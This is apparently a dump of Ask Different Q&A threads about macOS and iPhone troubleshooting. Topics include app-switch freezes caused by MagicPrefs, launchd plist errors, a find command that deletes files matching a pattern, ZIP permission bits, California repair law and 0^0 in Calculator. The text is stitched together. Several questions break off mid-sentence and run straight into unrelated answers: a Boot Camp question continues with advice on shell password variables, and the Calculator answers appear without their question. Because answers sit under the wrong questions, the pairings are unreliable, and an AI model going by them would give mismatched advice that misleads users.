you\nSteve.\n\nA: This what my connector looks like, the serial number is only 8 \n\nA: I think it's genuine. I live in Califomia. You guys don't know anything.\n", "Q: macOS temporarily freezes After working fine for days, my Mac has started freezing temporarily. This is triggered by switching between applications.

Once it occurs, it occurs on every switch, no matter between which applications.\n\n*It doesn't matter how I switch, either CMD-TAB or by selecting an other apps window by mouse, the problem is the same.\n\n*The problem occurs both with external monitors attached and when working \"stand alone\". (Before, I thought it had to do with external monitors, but recently the problem occurred when I was working \"stand alone\", so that theory is off the table.)\n\n*The problem occurs every couple of days now.\n\n*Normally, I never shutdown or reboot my Mac. I just close the lid and it goes to sleep until I open the lid again.\n\n\nDetails:\n\n\n*\n\n*macOS version: 10.13.5 (17F77)\n\n*MacBook Pro (Retina, 15-inch, Mid 2014)\n\n\nDoes someone have had a similar problem? If so, what was the cause en did you find a solution? If not, where do I start to look for possible causes?\n\nA: Can't comment, so here's an answer. In my case the culprit was Palua, an app that switches the mode of function keys depending on the active application. So it's basically the same issue Bart had. Closed that app and all freezes are gone.\n\nA: TL;DR\nI found out that my problem was caused by the no longer maintained MagicPrefs software. Uninstalled it, problem gone!\nHow I found the culprit\nToday the problem occurred again, and I think I managed to find the culprit! Once the problem occurred, I opened Activity Monitor to see if I could spot some process doing weird. The first thing I noticed, was that the CPU load was low overall. No processes were taking up more than 20% CPU.\nThen I right clicked on the column headers to add some more columns, hoping I would find a clue. I added the column showing if a process was unexpectedly stopped. (My MacOS is set to Dutch, the column is called Plots. beëind. in Dutch, I don't know the exact column name in English.) I immediately noticed that the hidd process had a \"Yes\" in that column.\nSo I went Googling and found this explanation of what the hidd process is. It's the Human Interface Device Daemon. The article states:\n\nIf high resource usage persists, the likely culprit is third party software. If you’ve recently installed drivers for a third party input device, or software that lets you do things like customize your key bindings, this could hypothetically be the issue. Try uninstalling this software, then see if that solves the issue.\n\nThat made me think about software I have installed that has to do with Human Interface Devices. There wasn't anything installed recently, but I was using MagicPrefs for some years. I went to their website to see if there were any updates and saw this notice:\n\nMagicPrefs is more than 5 years old now and is no longer mantained, the functionality it provided was made possible by Api's that are now deprecated and reverse engineered private Apple frameworks. Apple is not likely to replace the deprecated Api's nor provide access to the underlying multitouch technology so that's the end of the line for MagicPrefs and similar software.\nTLDR if it doesn't work anymore thats it, if it still works then its just a matter of time until it won't.\n\nWhen I uninstalled MagicPrefs, the freezing problem immediately disappeared! I think that proofs that MagicPrefs was the culprit. A pity I can't middle click any more, but I'm relieved that this weird problem is gone now!\n\nA: 'Plots. beëind' = 'Sudden Term.' in English. I have lots of processes with 'Yes' in that column, though, so I'm not sure what it shows.\nAnyway, I landed here after many months of similar behaviour on two MacBooks – the latest being just a few moments ago. This time it triggered a hard reset, whereas it usually just renders the Mac unusable (with audio still playing, weirdly) until I manually reset.\nPalua is installed on both, so now disabled and fingers crossed...\n", "Q: Can Firewire 800 network interfaces be bonded? I've got a few 2009 and 2010 Mac Pros and realized that the Firewire 800 ports are just sitting there going to waste.  I currently use 2 bonded ethernet ports on an additional card to facilitate some faster speeds between two of my workstations that need faster data transfer, but 2 Firewire 800 ports bonded with networking enabled could proffer several times more performance increase.\nCan FW800 with networking enabled be bonded like a standard network interface in macOS 10.13?\n\nA: So decided to test this with an extra workstation. I was able to assign static IP addresses to both FireWire ports (the first port was active right off the bat, but I had to add the 2nd one).  Both ports can talk in each direction to each workstation on the local isolated subnet.  But when I go to create a bond, the interfaces are not listed when I go into \"Manage Virtual Interfaces.\"  \"New Link Aggregate\" only shows ethernet devices - NO FIREWIRE devices.\nOne thing that I did find out was that 1 FireWire 800 network interface is slightly faster than 2 1 gigabit interfaces bonded.  I was seeing about a +15 MBps down & +3 MBps up differential pretty consistently\nThe next thing I need to try to figure out is whether or not there's a way to force an aggregate bond from the shell in Terminal.\nUPDATE: So I think I'm close to solving this, but I'm now having a problem where my FW800 ports have stopped functioning on one system and I have a bug report in to Apple right now in hopes to resolve it.  As per my above link, I now think I can perform this on the shell (sudo networkSetup createBond bond0 interface1 interface2)... IF it allows me to, but I can't test until I resolve this other issue.\n", "Q: `launchctl export` command not working? According to the man page of launchctl, there is an export command:\nexport   Export all of the environment variables of launchd for use in a shell eval\n         statement.\n\nHowever, when I try to use this command, I get the following message.\nUnrecognized subcommand: export\nUsage: launchctl <subcommand> ... | help [subcommand]\n\nWhat's going on here? Did the command exist at some point, but was removed for some reason, and someone forgot to update the man page?\n\nA: Apparently launchctl export is just gone.\nFWIW launchctl dumpstate appears to contain that info (and much much more), so given enough effort, one could parse it out of there, I guess.\n", "Q: Finder not responding My Mac is working perfectly but for the fact that Finder won't respond. Unless another app is running, my Mac's toolbar isn't showing up. Also, some of Finder's functions e.g. shut down, restart, and so many more are disabled. When I right click its icon, it says \"Application Not Responding\" or something along those lines. I have tried relaunching from the GUI, because the toolbar disappears every time I close other applications, I couldn't do it from the toolbar, and even the killall command doesn't work. I have to use the sudo shutdown -r now command to restart.

The built in keyboard and trackpad just all of a sudden died (no light in caps lock for example). Nothing works. But if I plug in a usb mouse and external keyboard they both work fine. Its not a hardware issue because If I use a linux live usb key and boot into it at start up the keyboard and trackpad work fine. \nI was wondering if anyone else has had a similar issue. I've seen issues like this, but those are all from a few years ago at least.\n\nA: I'm not sure what model MacBook you have, but Apple just recently issued a \"Keyboard Service Program for MacBook and MacBook Pro.\" Check out this link (https://www.apple.com/support/keyboard-service-program-for-macbook-and-macbook-pro) to see if your model is eligible. Hope this helps :)\n", "Q: Mac very very slow or won't boot I recently tried upgrading my parents' iMac from Snow Leopard (I think) to El Capitan. It started out all right, but after the first reboot, it became very very slow. That each, each minute remaining on the progress bar took approximately 2 hours. After running for over 48 hours I had to shut the computer down (by holding the power button). Since then whether I try resuming the installation, booting the recovery partition or booting an external bootable USB of the El Capitan installation disk, I get the same thing, which is that the boot progress bar gets slower and slower, taking several hours to reach the end, and then nothing further seems to happen.\nI've tried resetting the PRAN. Makes no difference.\nI'm thinking this must be something in the hardware, and the next step would be to remove the hard drive and test it using a different computer.\nBut maybe someone out there has other suggestions?\nI would add that I have a time machine backup of the computer in its last usable state, and quite happy to restore from that. But if I can't even boot a recovery partition, then I'm stuck anyway.\n\nA: Sounds like it might be a dying hard drive. Can you boot the Mac off another system, either an external hard drive or another Mac via Target Disk mode, and see how that runs speed-wise? Then run SMART Utility and see what it says about the internal hard drive\n\nA: Since your seeing that this happens with booting from USB, this may be an issue with other hardware as well. Apple has User facing diagnostics for this: Hold Option-D while booting to boot over the internet to diagnostics. This should run for 3-10minutes and display any errors detected. If you boot to a question mark or other screen your unit may be too old for internet diagnostics and instead should be booted off the HDD: D on boot. \nIf you don't receive any errors you can try booting in Verbose Mode Command-V or Single User mode Command-S, you should see text while booting. The messages displayed may indicate if this problem is hardware related or software related. This may be enough to pinpoint what is causing the problem.\nMost Apple Authorised repair centers will perform a more in-depth diagnostic on your unit at no charge, this is a 5-10m scan that gives a more thurough report than the user diagnostics. If you check with a technician most would be willing to run this and a more in depth scan for you at no cost. \n", "Q: How to fix iPhone X iOS 11.4 cellular data enabling issue? It’s random but I’ve been having issues with enabling cellular data on some apps I’ve downloaded.\nWhen I first start the app and it asks to use data I choose WiFi and cellular data. It’ll then warn me that there is no internet connection. I’ll then proceed to settings/cellular data and find the app, it’s in the off state. Once I go into it and choose either WLAN or WLAN & Cellular Data and go back it remains in the off state.\nI’ve tried reinstalling the apps and it seems this setting is saved in the phone. Again, it is random which apps this happens to but when it does it’s not fixable.\n\nA: I contacted Apple support and found a solution. I attempted to reset network settings and privacy settings but those didn’t work. After I “Reset All Settings” it set every app to have enabled WLAN & Cellular data and everything is now working properly.\n", "Q: Cannot type right curly brace in VIM For some reason, I cannot type right curly braces (}) in VIM. On my German keyboard, the shortcuts are <ALT-8> and <ALT-9> for left and right braces, respectively. These work in all applications, except for VIM, which does not recognize <ALT-9>.  \nI use VIM 8 in iTerm2 on macOS 13.3. There are no plugins installed in VIM. None of the different :*map commands lists anything related to <ALT-9>.\nHow do I get my right curly brace back into VIM?\n\nA: While checking the questions from @arcdale's comment, I found that <ALT-9> does not produce a } on the commandline, too. The cause of this was simply that I had mapped the navigation shortcut to switch panes in iTerm  to <ALT-Number>. Hence, binding switching panes to another combo solved the problem.\nHowvever, this does not explain why there was a problem with <ALT-9>, while all the other combinations, <ALT-5> to <ALT-8>, worked as expected.\n", "Q: Can I fresh install a Beta version of macOS? Current Beta access program enables one to upgrade to macOS Mojave from a stable release, but I want to try out a fresh installation instead of upgrading with previous data, so that I can assess it better.\nI've downloaded an application named \"macOS Mojave Beta\" from the App Store, and running it would presumably result in an upgrade. Now I wonder what to do next. Would creating a bootable installer and booting from it be a good idea, when I'm working with a Beta version?\n\nA: There's some misconceptions here.  Let's clear them up....\n\nCurrent Beta access program enables one to upgrade to macOS Mojave\n  from a stable release,\n\nNo, it gives you access to prerelease software that you can install on your device.  They make no mention \"enablement of upgrade.\"  Granted, since Mojave hasn't been released, it will be a de facto \"upgrade\"\n\nWould creating a bootable installer and booting from it be a good\n  idea, when I'm working with a Beta version?\n\nA better question would be, \"Why wouldn't it be a good idea?\"\nA beta is, again, prerelease software and it will have bugs. \n\nPlease note that since the public beta software has not yet been\n  commercially released by Apple, it may contain errors or inaccuracies\n  and may not function as well as commercially released software.\n\nWhen you download the software, you are presumed to have read and be aware of this.  There's nothing precluding you from attempting to install it via USB and it's encouraged.  Should you find an issue, report it to Apple.\nAnd....\nIt's important to note that Mojave and all beta software in general is being made publicly with the expectation that you leave feedback about issues/problems/bugs that you discover.  Expecting the software to function without issue or as a fix for what plagues released software is an unrealistic expectation. \nIn other words, don't run this on a \"production\" machine and make lots of backups of your data.\n", "Q: Reverse search is not working on mysql terminal on my mac I was using the mysql in ubuntu terminal. Reverse search was working fine on my ubuntu terminal. Recently I switched to mac, on mac terminal reverse search works fine normally but when I logged in to mysql the reverse search was not working. \nPlease suggest some answers I will be using reverse search frequently.\nReverse search is a bash functionality where you search your command history on the fly. More on reverse search can be found here\n\nA: Reverse search as triggered by Ctrl-R is a functionality provided by bash and which searches within the shell's command history. Once you start mysql you rely on the keyboard combinations available there, you can't use the bash shortcuts while mysql is running.\nIf you want to use reverse search with mysql you need a version with readline support compiled into it. \n", "Q: Can't boot to bootcamp windows anymore I think I made a big mistake: I wanted to boot to ubuntu from my usbstick, therefore I used the ppa mactel-boot and I could boot into ubuntu (this tutorial: https://medium.com/@mmiglier/ubuntu-installation-on-usb-stick-with-pure-efi-boot-mac-compatible-469ad33645c9).

I'm aware that changing the password would solve the problem, but for reasons this is not an option.\n\nA: Slightly offtopic, but maybe useful if you want to stick to putting credentials with special chars in a Shell variable.\nRegarding your bash commands I will point you to several topics:\n\n\n*\n\n*PWD is a always present ENV variable showing the current working\ndirectory (Print Working Directory). Omit using that name for a PassWorD variable :-).\n\n*There is a significant difference in using double quotes and single\nquotes. Double quotes embrace a string, which also can contain expandable variable names and is always subject to escape problems. Single quotes define a fix string and will be treated as such, e.g. no variable expansion will be done.\n\n\nExample:\n# fix string\ntatooine-2257:~ mallert$ export P='<word'\ntatooine-2257:~ mallert$ echo $P\n<word\n# no variable expansion\ntatooine-2257:~ mallert$ export P='<word $PWD'\ntatooine-2257:~ mallert$ echo $P\n<word $PWD\ntatooine-2257:tmp mallert$ echo $PWD\n/tmp\n\n\n\n*Finally - treat variable names in expansion distinguishable from usual text like referring to ${variablename}.

Choose a different address. \nThe email address I intended to change (a Gmail address) is mine and I had another Apple ID opened with that earlier. I was not able to delete that account, as Apple doesn't allow that. Hence, I put a Yahoo email in the account so I could remove the Gmail from the account. So, currently, there is no Apple ID registered with the Gmail address. \n\n\n*\n\n*Why can't I switch my current Apple ID to the Gmail address? \n\n*Should I transfer all my info to the Gmail as a newly Apple ID and use that if the change is not possible?\n\n\nA: Had exact same problem. Called Apple Support. Explained problem to them. Changing emails on Apple ID's is a little tricky so my call had to be bumped up to the next level of support, but the problem was quickly ironed out. And I had THREE email addresses going! LOL!\n\nA: From apple support: You can't use a \"rescue\" email address to sign in to Apple. If you try to use a rescue email to sign in, you will get the error message: \"This email address is not available. Choose a different address.\"\nI had exactly this problem, and switching to my old mac.com email address fixed the problem.\n\nA: You are likely already using that email address as the \"alternate\" email and/or \"rescue\" email on another Apple ID.\nUsing previous alternate email as apple id\n", "Q: I have Messages in iCloud but messages still not perfectly synced I have Messages in iCloud on my iPhone (6S, latest OS version 11.4) - or at least I think I do: In iPhone Settings -> [my Apple profile] -> iCloud I have Messages switched to on. I also have Messages on my MacBook Pro, which has the latest version of Mac OS.\nHowever today my iPhone was off because it didn't have enough charge. My Mom (who also has an iPhone with iMessage) sent me a message. The message showed up on my Mac. However even after I restored power to my iPhone and restarted it a couple times, the message never showed up on my iPhone.\nSo what is going wrong? I thought this, at least, would be solved by Messages in iCloud.\n\nA: While there is no sync now button, you could force one by turning iCloud Sync off and then back on. \n", "Q: Terminal command for removing all named files except for one In Terminal.app, how can I delete all files of a certain name except for one extension?  For example if I have:\nFile.docx\nFile.ppt\nFile.pdf\nFile.xlsx\nFile.out\nFile.app\nFIle.otherextension\nFile2.docx\nFile2.ppt\nFile2.pdf\nFile2.xlsx\nFile2.out\nFile2.app\nFIle2.otherextension\n\nall in one directory, how can I delete all of the File ones except for File.out?  \nExpected ls output at the end:\nFile.out\nFile2.docx\nFile2.ppt\nFile2.pdf\nFile2.xlsx\nFile2.out\nFile2.app\nFIle2.otherextension\n\n\nA: The following will delete all files named File (and only those) within the current folder, except ones with extension .out:\nfind . -type f \\( -iname \"File.*\" ! -iname \"*.out\" \\) -delete -maxdepth 1\nIf you want to perform this operation recursively (traversing all subfolders), remove -maxdepth 1:\nfind . -type f \\( -iname \"File.*\" ! -iname \"*.out\" \\) -delete\nThe i in -iname performs a case-insensitive search, so file.*, FILE.*, etc. will be deleted as well. Likewise, file.OUT would be spared.\n\nA: Try this:\nls File.* | fgrep -v .out | xargs rm\n\nThis corresponds to your description: select all files named File with some extension, remove the one with extension .out from the list, and delete the others.\n\nA: Using ksh's extended glob.\nrm !(*.out|File2.*|FIle2.*)\n\nWhich says in words- remove files that do not end in .out or begin with File2. or begin with FIle2.\nksh extended glob is also available in bash. You must turn on the option with shopt -s extglob. This solution will fail if you exceed ARG_MAX.\nMake sure that you are in the directory where these file exist or you could unintentionally remove files. \n", "Q: How to display contact anniversaries in MacOS Calendar? Is there a way to pull in anniversaries for contacts to the Birthday calendar or another calendar in the MacOS Calendar app?\n\nA: You could make a new calendar with, say, Google, import the anniversaries into that calendar, then subscribe to that calendar with Apple Calendar. \n", "Q: Lightning Headphones with a splitter? I got these great-sounding new Fidelio M2L/27 Lightning Headphones that take the digital signal through the lightning connector and then use the high-quality DAC in the headphones themselves so I can listen hi-fi audio from my iPhone 8. However, I am also a mobile app developer and hence I need to also often connect my phone to my computer to debug. I bought a cheap lightning splitter (1 male lightning to 2 female lightning) on Amazon and it doesn't work with the earphones - even if that's the only thing plugged in. \n1) Is this an issue with the splitter not being MFI certified? Will my headphones not work if they are the only things plugged in?\n2) If I do get an MFi certified adapter will I be able to use the headphones and have the data connection to the computer at the same time? Do lightning connectors allow two data connections at once? \n\nA: I looked up a couple of splitters including one from Belkin and another cheap one from Amazon. Neither splitter supports data transfer at all, through either port.\nI'd hazard a guess that this isn't possible. At least I haven't been able to find a device that explicitly states that it does support data.\n", "Q: Re-applying ComboUpdate to Sierra after later SecurityUpdates are installed It is often said that one troubleshooting attempt for macOS is\nThe universal panacea for macOS problems: install the Combo updater\nOn a machine running macOS 10.12.6 an attempt to do so will result in the ominous error message from Installer.app:\n\nmacOS Sierra update can't be installed on this disk.This volume does not meet the requirements for this update.\nSimilar to the error message here on Ask Different: macOS Sierra update can't be installed on this disk.This volume does not meet the requirements for this update\n\nWithout giving away the slightest hint at what the requirements really are.\nAfter searching the net it appears in this case to be caused by later SecurityUpdates installed that increment the build number:\n\nIf you previously installed Security Update 2017-001; then that's expected, at the moment. The installer script checks for a build version of 16G29 or older; but after 2017-001, you'll be on 16G1036.\nPerhaps Apple will eventually refresh the combo package to reflect recent changes.\nApple Communities: 10.12.6 Combo Update, Nov 7, 2017 10:38 AM \n\nThe machine in question runs 10.12.6 (16G1408) and had the SecurityUpdate 2018-003 applied. A freshly downloaded ComboUpdate from Apple: Download macOS Sierra 10.12.6 Combo Update Date: Post Date: Jul 19, 2017 reveals an installer package that is dated to 15. July 2017 at 10:19. So, no updated ComboUpdater as hopefully hinted at in the community answer at Apple.\nHow to fix this situation?\nPreliminary ideas: Rolling back a security update seems not really possible. Would just changing the build number of the installed system and then re-applying Combo and Security update solve this impasse?\n\nA: You could try using macOS Recovery. Simply hold ⌘ cmd-R during startup and follow the prompts to reinstall macOS.\n\nThis will reinstall the current version of macOS installed on your Mac. You can then check whether to reapply any supplemental updates.\n\n", "Q: Manage Guest Account via Profile Manager I have enabled the guest account for all of the iMacs and Macbooks in my school. I would now like to use Profile Manager to trim down the dock for the Guest user, set a custom homepage for Safari and configure Safari to launch new windows with the homepage.  I am struggling to find a tutorial for accomplishing this.  Any tips?\n\nA: This is not possible.  Apple's Profile Manager is lacking in many areas, and this is one of them.  Apple does not provide any tools or documentation for managing the guest account on multiple remote computers, or creating a profile to define and/or configure them.\nUpdate: It has been about half a year since I posted this answer and in that time I have gained more insights into managing macs in a school environment.  Here are my thoughts:\n\n*\n\n*If you are managing student-facing macs in a school, your number one strategy should be to migrate to chromebooks. Cheaper, more secure, and a thousand times easier to manage.\n\n\n*If manage macs, you need to use something like Jamf to manage them.  Apple Profile Manager is lacking.\n\n\n*Even with a mac management service like Jamf, using the Guest user account for students is a challenge.  You will need to create your own \"pseudo\" guest user, and just manage it with scripts so it is always clean for the next student.\n\nA: It looks like there is a way to make Guest account settings \"persistent\", it's just a bunch of settings files.\nSee this hint for how to get those settings files configured how you like them.\nSo you would copy the Guest preference files (once configured how you please), and then copy them to that User Template folder on all your deployed computers, so every Guest login starts with those settings.\nI haven't used Profile Manager, but hopefully you have some simple way to copy the /System/Library/User Template/English.lproj/ folder to all of your client computers.  Please post if you find a good way to copy a system folder to all the Macs in your control.\n(Also you'll want to delete everything inside the \"Keychains\" folder before deploying, or you'll get keychain popups at Guest login. See the comments in the aforementioned hint.)\n", "Q: Multiple bluetooth devices connected to an iPhone? I like to run with my The House of Marley Positive Vibration 2 Wireless Headphones, I've been thinking about getting Polar H10 Heart Rate Sensor.\nMy question is - will these two devices both work at the same time with an iPhone SE (I'd upgrade if necessary)? I'm usually streaming music with Spotify and would love to receive data from HR rate sensor at the same time. \nWill the iPhone battery last less with more than one bluetooth device connected? \nWhat if I keep adding bluetooth devices? Is there a limit?\n\nA: Yes they will work at the same time! Apple recognizes that one is a health device and the other is a listening device so u are able to use both at the and time!! I speak from experience because I sometimes have 3 devices connected at the same time (Headphones, Apple Watch, Health Device)\n", "Q: Automator to get PDF Annotations and export to Excel I'm trying to make a macOS service using Automator to extract PDF annotations and get the information into an Excel file.\nI can successfully get the annotations from a PDF, and export them to a text file. But if I try to parse the same information to a new Excel file, all the information is pasted into a single cell.\nWhat would be the correct steps in Automator, to have each text line in separated Excel rows?\n\nA: Assuming you know the basics of Automator....Create a workflow with these Actions:\n\nIn the AppleScript Action copy & paste the following: \n    on run {input, parameters}\n    set delimitedList to paragraphs of (input as string)\n    set myExport to \"\"\n    do shell script \"touch /tmp/myFile.csv\"\n    repeat with myLines in delimitedList\n        set myLineExport to \"\"\n        set AppleScript's text item delimiters to {\"    \"}\n        set listItems to every text item of myLines\n        repeat with eachItem in listItems\n            set myLineExport to myLineExport & \"\\\"\" & eachItem & \"\\\",\"\n        end repeat\n        set myExport to myExport & myLineExport & \"\n\"\n    end repeat\n    write_to_file(myExport, (POSIX file \"/tmp/myFile.csv\" as alias), false)\n    return POSIX file \"/tmp/myFile.csv\" as alias\nend run\n\non write_to_file(this_data, target_file, append_data)\n    try\n        set the target_file to the target_file as string\n        set the open_target_file to open for access file target_file with write permission\n        if append_data is false then set eof of the open_target_file to 0\n        write this_data to the open_target_file starting at eof\n        close access the open_target_file\n        return true\n    on error\n        try\n            close access file target_file\n        end try\n        return false\n    end try\nend write_to_file\n\n\nNote: You may run into issues if your annotations contain quotes, however there will be no problem if you use smart quotes.\nYou can select your pdf in the first prompt.\n\nSources: https://www.macosxautomation.com/applescript/sbrt/sbrt-09.html\n", "Q: GCC with-gxx-include-dir is set to iOS 11.4 simulator I'm trying to compile https://github.com/zeromq/libzmq which requires me to run autoconf and then ./configure.

After some searching, I decided the best way to do this was by using launchd. However, I'm running into an error. \nThe .plist which I have in my user LaunchAgents directory is as follows:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> \n<plist version=\"1.0\"> \n<dict> \n  <key>Label</key> \n  <string>local.SkeletonBow.EjectAllDrivesAt8</string> \n  <key>Program</key> \n  <string>/usr/bin/osascript</string> \n  <key>ProgramArguments</key> \n  <array> \n    <string>/usr/local/etc/Daily\\ Scripts/Eject\\ All.scpt</string>\n  </array> \n  <key>StartCalendarInterval</key>\n  <dict>\n      <key>Hour</key>\n      <integer>08</integer>\n      <key>Minute</key>\n      <integer>00</integer>\n  </dict>\n</dict> \n</plist> \n\nThe AppleScript in question, Eject All.scpt, runs fine when I run it with osascript Eject\\ All.scpt in my zsh shell.\nAccording to this site, I should \"load the job\" into launchctl. I did this by running, according to their instructions, the following:\nlaunchctl load ~/Library/LaunchAgents/local.SkeletonBow.EjectAllDrivesAt8.plist\n\nAnd then tried to test it by running\nlaunchctl start local.SkeletonBow.EjectAllDrivesAt8.plist\n\nHowever, this particular action causes a cross to be shown in the Terminal, implying that something wrong has happened. I'm guessing that it's due to the syntax in my .plist file.\n\nA: One shouldn't include the .plist extension when starting a launchtl process directly. Your command should read, instead, launchctl start local.SkeletonBow.EjectAllDrivesAt8\nAlso, the launchctl man pages indicate one shouldn't use leading zeroes when setting Calendar start time. The content should be <integer>8</integer> and <integer>0</integer> for the Hour and Minute keys.\nKeep in mind, too, that when using CalendarInterval (as opposed to an elapsed-time Interval) to set a launch time for a process, that if the machine should unexpectedly be asleep at 8:00AM and therefore be unable to initiate the process, it will initiate the process upon awakening. That does not happen when the time setting is interval based.\n\nA: Maybe this part is the problem:\n  <key>Program</key>\n  <string>/usr/bin/osascript</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>/usr/local/etc/Daily\\ Scripts/Eject\\ All.scpt</string>\n  </array>\n\nApple's documentation doesn't mention a Program item.

So I know they're stored somewhere in there.\nNow my question is: how does macOS store Unix file permissions in ZIP files? Unfortunately I could not find any information about this on the net.\n\nA: The permissions are stored in the same manner as they are on other Unixoid systems, such as for example Linux.\nIf you look at the central directory header in the zip-file, you have for each file stored in the Zip-file a field called \"external file attributes\". The field is at byte 36 in the header and is 4 bytes long.\nThe two last bytes in that field contains the file permissions on macOS - to be precise it is the last 9 bits (the least significant 9 bits).

The one quick triage step is to see if making a new user account also shows the error. \nAssuming that you can’t just live with the artifacts and hope that the software update will fix them and assuming that you have a full backup of all the data and programs you need to reinstall, I would triage this further:\n\n\n*\n\n*Install a totally clean macOS to an extra hard drive as a quick test of the current updated system and the graphics hardware work all together. (Bonus points is you now have downloaded the installer and optionally run createinstallmedia for a bootable installer.)\n\n\nBased on the results there, you might open a support ticket with the vendor or seek a repair if the issue persists on a totally new and updated install of the OS. Hopefully you can cure this in software, but the age of the GPU and the specifics of the failure could easily be what the beginning of what failing portions of the hardware looks like visually.\n", "Q: How to change the stores in the App Store after having added funds?

If you search for \"MAC address\" you'll find output from configd detailing the MAC addresses of the network interfaces on the Mac at the time.\nNote: If you're doing any serious type of forensics, it is bad practice to boot up from the storage you're examining.

Unfortunately, this did not fix this issue.\nAlso don't believe its a hardware issue as this my second X, and also happens on my spare iPhone 7....\nIf any of you have a thermometer to check the temp that would be awesome.\nThank you.\n\nA: 92 degrees F is not an issue. Snapchat and similar programs that use the camera, GPS, and have higher GPU/CPU requirements will cause the phone to get warmer. If it was 92C then that wouldn't be good, but 92F just means you're using a lot of battery power. \n\nA: Yah, the processors in these things are highly capable and can put out a lot of heat. If it becomes uncomfortable, try looking at your environment. Switch to a less constrictive protective case. This can help for a number a reasons. Some cases can impede cellular and wifi strength and cause the device to work harder to maintain a connection. Some cases can also be thermally restrictive and don't dissipate heat very well.

This question answers the question in places for most cases.\nAccording to their warranty\n\nProducts purchased in the state of California, United States, as\n  required by statute \n\nsource\nSo it appears that items are serviced and are repaired longer in California yes?\n\nA: Residents of California can obtain service and or parts for up to 7 years under the Song Beverly Consumer Warranty Act.\nFirst, what Apple terms \"vintage\" and \"obsolete\" are not in anyway bound legally to what California law provides for.  For the record, Song-Beverly provides for manufacturers making parts available for up to 7 years; Apple can, in it's discretion, make \"Vintage\" in 8 years.\nSecondly, the law only allows for replacement parts and service information be made available. \n\nEvery  manufacturer making an express warranty with respect to an\n  electronic or  appliance product described in subdivision (h), (i),\n  (j), or (k) of Section 9801 of the  Business and Professions Code,\n  with a wholesale price to the retailer of one hundred  dollars ($ 100)\n  or more, shall make available to service and repair facilities\n  sufficient  service literature and functional parts to effect the\n  repair of a product for at least seven  years after the date a product\n  model or type was manufactured, regardless of whether the seven\n  - year period exceeds the warranty period for the product\n\nTo put this in layman's terms, see:  Sold a defective electronic device?

Instead, the law requires\n  expressly warranted electronic goods to have replacement parts\n  available to consumers and service information available that allows\n  enough information for repairs.\n\nWhat's most important here, is the context of that warranty point you brought up:\n\nProducts purchased in the state of California, United States, as\n  required by statute.\n  \n  \n*\n  \n*Owners of vintage Mac products may obtain service and parts from Apple service providers within the state of California, United States.\n\n(emphasis mine)\nTL;DR\nThe Song Beverly Consumer Warranty Act says that the manufacturer (Apple) must make available parts and service information for up to 7 years on your electronic device (MacBook) that was purchased in the state of California.

Since upgrading it to High Sierra, it doesn't seem to sleep properly. Before, I could leave it in sleep mode on its battery for over a week and still come back to a decent amount of charge. Now it seems to only turn the display off - after leaving it unplugged for 24 hours (wifi off), I opened it today to find the battery at 25%. Power Nap is disabled. I do have Caffeine installed but that's also switched off.\nI tried pinging it after closing the lid and continue to get a response from the Thunderbolt ethernet adapter long after it should be inactive, even with Wake For Network Access switched off.

The only reason that you aren't seeing an error being generated is due to the fact that the version of Calculator in question didn't trap for that input error.\n\nA: There is some semicontroversy about 0⁰ that boils down to the function x^y having a discontinuity at (x,y)->(0,0).  This is a semicontroversy since it is mathematical nonsense to forbid a function having a value at a discontinuity.\nIt is general practice to embed integers into the reals such that a function defined on the reals matches the same function defined on integers whenever the real function assumes integral values.  So there is little point in distinguishing 0.0^0 from 0.0^0.0 .\nNow x⁰ with the integer 0 as exponent is a product containing exactly zero factors of x.  Since no factors of x are contained in its value, there is little point in assigning it a value depending on x, and its value as an empty product is pretty clearly 1, the neutral element for multiplication.\nThis makes also good sense since it does not arbitrarily restrict the binomial theorem to non-zero values.  In a manner, this is an argument based on trying to complete the function x⁰ sensibly at x=0, making it defined and continuous everywhere.\nIf we try this with the function 0^x instead, the limit at x=0+ may be 0, but defining it as such still does not help curing the essential discontinuity since the function is undefined for negative x.\nNow calculators tend to calculate x^y as exp(y*ln(x)).  Of course that is bad news for x=0.  So such values have to be explicitly programmed or you'll arrive at not-a-number.  For explicit programming, you have to rely on the mathematical intuition of the programmer, and the typical programmer will be more guided by pseudomathematical intuition like \"a function must be continuous where defined\" than a mathematician would.\nIn addition, you can expect a flurry of comments from different users, and pure mathematicians will not revert to calculators for their vision of mathematical truth all that much, so you cannot expect their input to swamp that of others.\nSo the result is a democratic one more than a mathematical one, and democratic majorities tend to change.\n\nA: While 0⁰ is generally undefined, some branches of mathematics do explicitly define it as 1 because, as you can see, this is the value to which the function y(x) = xˣ converges at n=0.\nLess formally, note that 0.50.5=0.707…; 0.20.2=0.725…; 0.10.1=0.794… and 0.010.01=0.955…. As you approach 0, the result will be approaching 1, which makes it quite logical and handy to define 0^0 as 1 in some cases.\nThus, none of these 3 results are incorrect per se and instead they all reflect different conventions on the value of this undefined expression.\nThere is a good Wikipedia article explaining the issue. See also Zero to the zero power – is 0⁰=1?.\n\nA: Most implementations of floating point arithmetic follow the IEEE 754-2008 standard, which specifies that pow(0,0) returns 1 (see §9.2.1).\nBut it also defines two other functions: pown(0,0) = 1 and powr(0,0) = NaN.\nWikipedia summarizes it as follows:\n\nThe IEEE 754-2008 floating-point standard is used in the design of\nmost floating-point libraries. It recommends a number of operations\nfor computing a power:[20]\npow treats 00 as 1. If the power is an exact integer the result is the\nsame as for pown, otherwise the result is as for powr (except for some\nexceptional cases).\npown treats 00 as 1. The power must be an exact\ninteger. The value is defined for negative bases; e.g., pown(−3,5) is\n−243. powr treats 00 as NaN (Not-a-Number – undefined). The value is\nalso NaN for cases like powr(−3,2) where the base is less than zero.\nThe value is defined by epower×log(base).\nThe pow variant is inspired\nby the pow function from C99, mainly for compatibility.[21] It is\nuseful mostly for languages with a single power function. The pown and\npowr variants have been introduced due to conflicting usage of the\npower functions and the different points of view (as stated\nabove).[22]\n\nOf course this has no bearing on what the correct mathematical result is: as others have noted, there is more than one possible answer, and IEEE had to make an arbitrary decision.\n", "Q: Remove SelfControl App Can anyone help me to remove the SelfControl app that is blocking my Facebook and YouTube?\nI'm using a MacBook Pro running macOS 10.11.6. I haven't contacted SelfControl app support for help yet. I've already deleted the app but it still affects my computer.\n\nA: You can remove the self control app and unblock access to websites regardless of whatever the timer was set to. This requires that you have administrative access to the computer and are comfortable using the Terminal and editing system files.\n\n*\n\n*Kill \"Self Control\" from \"Force Quit Applications\"\n\n*Run:\n\nsudo rm 